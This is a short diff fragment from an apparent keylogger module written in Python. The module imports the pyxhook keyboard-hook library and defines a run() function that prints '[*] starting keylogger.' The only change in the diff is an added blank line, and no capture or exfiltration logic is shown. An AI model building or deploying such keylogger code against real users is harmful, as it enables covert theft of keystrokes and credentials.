@@ -3,6 +3,7 @@ import os
 import pyxhook
 from rich import print as rprint
 
+
 def run(**args):
     rprint("[*] starting keylogger.")
     
